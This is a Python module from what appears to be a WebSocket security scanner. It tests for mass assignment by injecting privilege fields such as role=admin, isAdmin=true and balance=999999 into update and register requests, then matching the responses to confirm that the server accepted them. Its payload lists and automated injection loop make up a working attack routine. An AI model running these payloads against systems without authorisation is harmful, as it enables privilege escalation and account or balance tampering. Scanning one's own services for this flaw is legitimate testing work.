"""
Mass Assignment Attack Module
Server blindly assigns all user-provided fields to database objects.
Attacker can inject role=admin, isAdmin=true, verified=true etc.
"""
import asyncio
import json
import re
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── Mass Assignment Payloads ──────────────────────────────────────────────────
# Fields that should NOT be user-controllable
PRIVILEGE_FIELDS = {
    'role':            ['admin', 'superadmin', 'moderator', 'staff', 'root'],
    'isAdmin':         [True, 'true', 1],
    'is_admin':        [True, 'true', 1],
    'admin':           [True, 'true', 1],
    'verified':        [True, 'true', 1],
    'email_verified':  [True, 'true', 1],
    'is_verified':     [True, 'true', 1],
    'active':          [True, 'true', 1],
    'status':          ['active', 'verified', 'approved', 'admin'],
    'permissions':     ['admin', 'all', '*', ['read', 'write', 'admin']],
    'credits':         [999999, '999999'],
    'balance':         [999999, '999999'],
    'subscription':    ['premium', 'enterprise', 'pro'],
    'plan':            ['premium', 'enterprise', 'paid'],
    'banned':          [False, 'false', 0],
    'locked':          [False, 'false', 0],
}

# Base actions that accept user data
BASE_ACTIONS = [
    {'action': 'update_profile'},
    {'action': 'register'},
    {'action': 'create_user'},
    {'action': 'edit_account'},
    {'action': 'update_settings'},
    {'type':   'profile_update'},
    {'type':   'user_update'},
    {'cmd':    'update'},
    {'method': 'updateUser'},
]

# Patterns that confirm mass assignment worked
CONFIRM_PATTERNS = [
    (r'"role"\s*:\s*"admin"',           'role set to admin'),
    (r'"isAdmin"\s*:\s*true',           'isAdmin set to true'),
    (r'"is_admin"\s*:\s*true',          'is_admin set to true'),
    (r'"admin"\s*:\s*true',             'admin field true'),
    (r'"verified"\s*:\s*true',          'verified set to true'),
    (r'"status"\s*:\s*"admin"',         'status set to admin'),
    (r'"permissions"\s*:\s*"admin"',    'permissions set to admin'),
    (r'"balance"\s*:\s*999999',         'balance modified to 999999'),
    (r'"credits"\s*:\s*999999',         'credits modified to 999999'),
    (r'"subscription"\s*:\s*"premium"', 'subscription set to premium'),
    (r'"plan"\s*:\s*"premium"',         'plan set to premium'),
    (r'"success"\s*:\s*true',           'update accepted'),
    (r'"updated"\s*:\s*true',           'update confirmed'),
]


async def test_mass_assignment(ws_url: str, fast_mode: bool = False) -> bool:
    """
    Mass Assignment Test:
    Send update requests with extra privilege fields injected.
    If server accepts and reflects them = mass assignment confirmed.
    """
    found_any = False

    # Build combined payloads
    test_payloads = []
    for base_action in BASE_ACTIONS[:4] if fast_mode else BASE_ACTIONS:
        # Single field injection
        for field, values in list(PRIVILEGE_FIELDS.items())[:6 if fast_mode else len(PRIVILEGE_FIELDS)]:
            payload = {
                **base_action,
                'username':   'testuser',
                'email':      'test@test.com',
                field:         values[0],  # Inject privilege field
            }
            test_payloads.append((json.dumps(payload), field, values[0]))

        # Combined injection (multiple privilege fields at once)
        combo_payload = {
            **base_action,
            'username':  'testuser',
            'role':      'admin',
            'isAdmin':   True,
            'verified':  True,
            'status':    'admin',
        }
        test_payloads.append((json.dumps(combo_payload), 'combined_fields', 'admin+isAdmin+verified'))

    try:
        async with await ws_connect(ws_url, timeout=6) as ws:
            for msg, injected_field, injected_value in test_payloads:
                try:
                    resp = await send_recv(ws, msg, timeout=3)
                    if not resp:
                        continue

                    resp_lower = resp.lower()

                    # Skip rejection responses
                    if any(x in resp_lower for x in [
                        'invalid field', 'not allowed', 'forbidden field',
                        'unknown field', 'unexpected field'
                    ]):
                        continue

                    # Check if privilege field was accepted/reflected
                    for pattern, label in CONFIRM_PATTERNS:
                        if re.search(pattern, resp, re.IGNORECASE):
                            ev = Evidence.make(
                                payload=msg,
                                request=f"Injected field '{injected_field}' = '{injected_value}' into update action",
                                response=resp[:400],
                                proof=(
                                    f"Mass assignment confirmed: field '{injected_field}' = '{injected_value}' "
                                    f"was accepted by server. Pattern '{label}' found in response. "
                                    f"Server does not filter/whitelist incoming fields."
                                ),
                                reproduce=(
                                    f"1. Connect to {ws_url}\n"
                                    f"2. Send update request with extra field: {msg}\n"
                                    f"3. Server accepts '{injected_field}' = '{injected_value}'\n"
                                    f"4. Response confirms: {label}"
                                ),
                                injected_field=str(injected_field),
                                injected_value=str(injected_value),
                            )

                            severity = 'CRITICAL' if any(x in str(injected_field) for x in [
                                'role', 'admin', 'permission'
                            ]) else 'HIGH'

                            store.add(
                                ws_url,
                                'Mass Assignment via WebSocket',
                                severity,
                                f"Server accepted user-controlled field '{injected_field}'.\n"
                                f"Injected value: '{injected_value}'\n"
                                f"Server does not use field allowlisting.\n"
                                f"Attacker can set privileged attributes.",
                                ev
                            )
                            found_any = True
                            log.warning(f"Mass Assignment on {ws_url}: field '{injected_field}'")
                            return found_any  # Stop on first confirmed

                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue

    except Exception as e:
        log.debug(f"Mass assignment test error on {ws_url}: {e}")

    return found_any
